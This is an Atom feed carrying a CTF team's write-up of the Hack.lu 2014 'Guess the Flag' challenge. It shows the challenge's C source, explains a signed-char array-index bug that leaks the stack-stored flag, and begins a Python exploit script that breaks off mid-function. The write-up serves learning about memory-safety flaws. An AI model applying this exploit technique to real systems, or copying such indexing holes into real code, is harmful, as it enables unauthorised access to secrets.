<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[CaptchaFlag CTF Team]]></title>
  <link href="http://www.captchaflag.com/atom.xml" rel="self"/>
  <link href="http://www.captchaflag.com/"/>
  <updated>2014-10-28T16:35:43-04:00</updated>
  <id>http://www.captchaflag.com/</id>
  <author>
    <name><![CDATA[Captchaflag]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2014 - Guess the Flag]]></title>
    <link href="http://www.captchaflag.com/blog/2014/10/28/hack-dot-lu-2014-guess-the-flag/"/>
    <updated>2014-10-28T15:05:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2014/10/28/hack-dot-lu-2014-guess-the-flag</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>Look at that guy over there! He&#8217;s a bandit from the group that robs the
stagecoaches in unpredictable intervals. I think he hasn&#8217;t been with them for
very long, so he can&#8217;t tell whether you&#8217;re one of them. Try to look like a
bandit and talk to him. He probably won&#8217;t just tell you their plan for the
attack, but maybe you can ask him some questions?</p>

<p>nc wildwildweb.fluxfingers.net 1412</p>

<h3>Partial Source</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">is_flag_correct</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">flag_hex</span> <span class="cm">/* the user&#39;s guess in hex */</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">flag_hex</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">100</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;bad input, that hexstring should be 100 chars, but was %d chars long!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">strlen</span><span class="p">(</span><span class="n">flag_hex</span><span class="p">));</span>
</span><span class='line'>    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="kt">char</span> <span class="n">bin_by_hex</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="cm">/* table for looking up the value of a hex character – -1 means invalid */</span>
</span><span class='line'>    <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>     <span class="mi">0</span><span class="p">,</span>  <span class="mi">1</span><span class="p">,</span>  <span class="mi">2</span><span class="p">,</span>  <span class="mi">3</span><span class="p">,</span>  <span class="mi">4</span><span class="p">,</span>  <span class="mi">5</span><span class="p">,</span>  <span class="mi">6</span><span class="p">,</span>  <span class="mi">7</span><span class="p">,</span>  <span class="mi">8</span><span class="p">,</span>  <span class="mi">9</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="cm">/* 0-9 */</span>
</span><span class='line'>    <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="cm">/* A-F */</span>
</span><span class='line'>    <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="cm">/* a-f */</span>
</span><span class='line'>    <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>  <span class="p">};</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* the correct flag was censored out */</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;flag{0123456789abcdef0123456789abcdef0123456789ab}&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// decode flag_hex into given_flag so we can compare them</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">given_flag</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
</span><span class='line'>  <span class="n">bzero</span><span class="p">(</span><span class="n">given_flag</span><span class="p">,</span> <span class="mi">50</span><span class="p">);</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">50</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">value1</span> <span class="o">=</span> <span class="n">bin_by_hex</span><span class="p">[</span><span class="n">flag_hex</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span>  <span class="p">]];</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">value2</span> <span class="o">=</span> <span class="n">bin_by_hex</span><span class="p">[</span><span class="n">flag_hex</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">]];</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">value1</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="n">value2</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;bad input – one of the characters you supplied was not a valid hex character!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">given_flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">value1</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">)</span> <span class="o">|</span> <span class="n">value2</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// timing-safe comparison of the two flags</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">diff</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">50</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">diff</span> <span class="o">|=</span> <span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">given_flag</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="n">diff</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

<h2>Analysis</h2>

<p>An visual inspection of the source code raised some potential issues, but they
were all red herrings. For instance, the rtrim() function increments by 2
instead of one, but that doesn&#8217;t buy us anything:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">rtrim</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">str</span><span class="o">+</span><span class="n">strlen</span><span class="p">(</span><span class="n">str</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="n">p</span><span class="o">&gt;=</span><span class="n">str</span><span class="p">;</span> <span class="n">p</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strchr</span><span class="p">(</span><span class="s">&quot; </span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">*</span><span class="n">p</span><span class="p">))</span> <span class="k">break</span><span class="p">;</span>
</span><span class='line'>    <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">p</span><span class="o">--</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

<p>The challenge prompt says to compile the source with <code>gcc -std=gnu99 -g</code>, but
we added <code>-Wall and -Wextra</code> and compiled:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">guess_the_flag_censored</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">51</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span> <span class="n">warning</span><span class="o">:</span> <span class="n">implicit</span> <span class="n">declaration</span> <span class="n">of</span> <span class="n">function</span> <span class="err">‘</span><span class="n">bzero</span><span class="err">’</span> <span class="p">[</span><span class="o">-</span><span class="n">Wimplicit</span><span class="o">-</span><span class="n">function</span><span class="o">-</span><span class="n">declaration</span><span class="p">]</span>
</span><span class='line'>   <span class="n">bzero</span><span class="p">(</span><span class="n">given_flag</span><span class="p">,</span> <span class="mi">50</span><span class="p">);</span>
</span><span class='line'>   <span class="o">^</span>
</span><span class='line'><span class="n">guess_the_flag_censored</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">53</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span> <span class="n">warning</span><span class="o">:</span> <span class="n">array</span> <span class="n">subscript</span> <span class="n">has</span> <span class="n">type</span> <span class="err">‘</span><span class="kt">char</span><span class="err">’</span> <span class="p">[</span><span class="o">-</span><span class="n">Wchar</span><span class="o">-</span><span class="n">subscripts</span><span class="p">]</span>
</span><span class='line'>     <span class="kt">char</span> <span class="n">value1</span> <span class="o">=</span> <span class="n">bin_by_hex</span><span class="p">[</span><span class="n">flag_hex</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span>  <span class="p">]];</span>
</span><span class='line'>     <span class="o">^</span>
</span><span class='line'><span class="n">guess_the_flag_censored</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">54</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span> <span class="n">warning</span><span class="o">:</span> <span class="n">array</span> <span class="n">subscript</span> <span class="n">has</span> <span class="n">type</span> <span class="err">‘</span><span class="kt">char</span><span class="err">’</span> <span class="p">[</span><span class="o">-</span><span class="n">Wchar</span><span class="o">-</span><span class="n">subscripts</span><span class="p">]</span>
</span><span class='line'>     <span class="kt">char</span> <span class="n">value2</span> <span class="o">=</span> <span class="n">bin_by_hex</span><span class="p">[</span><span class="n">flag_hex</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">]];</span>
</span><span class='line'>     <span class="o">^</span>
</span></code></pre></td></tr></table></div></figure>

<p>Joy! an array is indexed with a character type, which is treated as a signed
value. The focus is now on exploiting that in order to access or change the
<code>flag</code> which is also stored on the stack. The potentially negative indicies are
only used when reading, which eliminates the possibility of injecting
shellcode. This seemed to be a let-down at first, but what we do see is that
the <code>value1</code> and <code>value2</code> variables can be influenced. This leads to the
population of the <code>given_flag</code> string. Can we force <code>given_flag</code> to be accepted
by copying the bytes from <code>flag</code>?</p>

<h2>Solution</h2>

<p>We ran the program locally under a debugger to discover that <code>flag</code> is located
128 bytes before <code>bin_by_hex</code>. Subtract the &quot;flag{&quot; prefix, and the offset for
the 44 byte hexadecimal string is at offset -123. The following code generates
an input which should exploit the defect:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="n">start</span> <span class="o">=</span> <span class="o">-</span><span class="mi">123</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Python doesn&#39;t support chr(-x), so do unsigned -&gt; signed conversion.</span>
</span><span class='line'><span class="k">def</span> <span class="nf">twos_comp</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">256</span> <span class="o">+</span> <span class="n">n</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Generate a flag which exploits the char-index defect. This flag should always</span>
</span><span class='line'><span class="c"># work, even though it is an invalid format.</span>
</span><span class='line'><span class="c"># In this code, a flag is a list of 44 hexadecimal bytes (strings of length 2)</span>
</span><span class='line'><span class="k">def</span> <span class="nf">generate_flag</span><span class="p">():</span>
</span><span class='line'>    <span class="n">s</span> <span class="o">=</span> <span class="n">twos_comp</span><span class="p">(</span><span class="n">start</span><span class="p">)</span>
